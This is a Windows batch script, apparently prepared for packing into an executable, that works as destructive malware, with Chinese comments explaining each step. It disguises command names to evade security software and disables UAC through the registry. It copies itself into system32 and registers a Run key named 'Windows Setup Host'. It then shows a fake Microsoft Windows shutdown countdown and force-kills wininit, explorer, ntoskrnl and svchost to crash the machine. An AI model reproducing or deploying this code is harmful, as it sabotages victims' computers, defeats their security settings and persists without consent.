::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyHcjLQlHcCilA1OGIrAP4/z0/9YAfruanAkD/0cwX25hpTzzb6oV8k3J6vOgd03w1pOrg5d6gTOxR5HFX4y5B9WTgwP0WXSa8kQgVWBsggM=
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJGyX8VAjFDdzczy+GG6pDaET+NR8MxwAaqYh0yrU/VU0X2hupQ/ibZ4ASR/XOfymQkP/8Z6JkS4ugPCzQIZ+pWGRItegmizOZHTQqEIzFAU=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF25
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF25
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJheFUEAlXbaTPoSORMuLmb
::ZQ05rAF9IBncCkqN+0xwdVsFHErScjrjU+1Oprmrv7vn
::ZQ05rAF9IAHYFVzEqQIdIRhGQxeNOn8YyPUr4eb/4P2UAINde/I6ao7P07qJYNMK+VHhePY=
::eg0/rx1wNQPfEVWB+kM9LVsJDDenCF6KSJAkzYg=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIHIRVQQxORfEK0FaEd5OT6++OIrA0cWuZ/S4rPz6Tu
::dhA7uBVwLU+EWHSN91A/OxRSWEShM3mqCacd/OH04Yo=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATEVotwBRJXXguRM22uRpYT+vj0/euTq0ITGqIedIObyL2JKPQAqlfhZpM/wH9e1qs=
::ZQ0/vhVqMQ3MEVWAtB9wBBJAWAiHfEy7CdU=
::Zg8zqx1/OA3MEVWAtB9wBBJAWAiHfEy7CdU=
::dhA7pRFwIByZRRmo/VYkJB4UawWNXA==
::Zh4grVQjdCuDJGyX8VAjFDdzczy+GG6pDaET+NR8MxwAaqYh0yrU/VU0X2hupQ/ibZ4ASR/XOfymQkP/8Z6JkS4ugPCzQIZ+hnaKC9SZpxrxdVib6Vs8DnYlyWbIiUs=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
del %TEMP%\1.vbs
echo On Error Resume Next>>%TEMP%\1.vbs
echo do>>%TEMP%\1.vbs
echo Set Of = CreateObject("Scripting.FileSystemObject")>>%TEMP%\1.vbs
echo set ws=createobject("wscript.shell")>>%TEMP%\1.vbs
echo dim OK,oShell>>%TEMP%\1.vbs
echo OK=False>>%TEMP%\1.vbs
echo set bag=getobject("winmgmts:\\.\root\cimv2")>>%TEMP%\1.vbs
echo set pipe=bag.execquery("select * from win32_process where name='%~nx0'")>>%TEMP%\1.vbs
echo For Each id In pipe>>%TEMP%\1.vbs
echo OK = True>>%TEMP%\1.vbs
echo Next>>%TEMP%\1.vbs
echo If not OK Then>>%TEMP%\1.vbs
echo ws.run"%AppData%\stop.exe",0,ture>>%TEMP%\1.vbs
echo wscript.sleep 1 >>%TEMP%\1.vbs
echo end if>>%TEMP%\1.vbs
echo wscript.sleep 3000>>%TEMP%\1.vbs
echo loop>>%TEMP%\1.vbs
::设置进程优先级为"实时"
wmic process where name='%~nx0' call SetPriority "Realtime"
wmic process where name='cmd.exe' call SetPriority "Realtime"
::将需要使用的命令设置为变量,防止被**软件检查
set t=taskkill
set win=wininit.exe
set to=timeout
set l=del
set r=rd
set g1=reg
set s=start
set m=md
set o=echo
set cp=copy
set docm=svchost.exe
set system=ntoskrnl.exe
set file=explorer.exe
%s% %TEMP%\stop.vbs
set auto=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
set UHC=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
::调用random变量,抽取120~1320直接的随机整数
set /a n=%random%%%1200+120
::调用random变量,防止工作目录名称重复
set /a a=%random%%
set /a b=%random%%
set /a c=%random%%
set /a d=%random%%
set /a e=%random%%
set /a f=%random%%
set /a g=%random%%
set /a h=%random%%
::修改注册表项(关闭UAC)
%g1% add %UHC% /v EnableLUA /t REG_DWORD /d 0 /f
%g1% delete %auto% /v setup /f
::复制本体到systen32里,并通过修改注册表添加启动项
%cp% "%~dp0%~nx0" "%windir%\system32\zh-cn"
%g1% add %auto% /v "Windows Setup Host" /t REG_SZ /d "%windir%\system32\zh-cn\%~nx0" /f
::创建vbs弹窗脚本,并运行
%o% CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName) >>%temp%\%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%.vbs
%o% msg=MsgBox("Power off after %n% seconds",1+15,"Microsoft Windows")>>%temp%\%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%.vbs
%o% CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName) >>%temp%\Wait2.vbs
%o% wscript.sleep 1 >>%temp%\Wait2.vbs
start /wait %temp%\Wait2.vbs
%s% %temp%\%a%.%b%.%c%.%d%.%e%.%f%.%g%.%h%.vbs
::使用vbs实现延时执行命令
set /a n123=%n%*1000
%o% CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName) >>%temp%\Wait1.vbs
%o% wscript.sleep %n123% >>%temp%\Wait1.vbs
start /wait %temp%\Wait1.vbs
::核心代码(结束系统服务进程导致系统崩溃)
%t% /f /im %win%
%t% /f /im %file%
%o% CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName) >>%temp%\1Wait.vbs
%o% wscript.sleep 1 >>%temp%\1Wait.vbs
start /wait %temp%\1Wait.vbs
%t% /f /im %system%
%t% /f /im %docm%
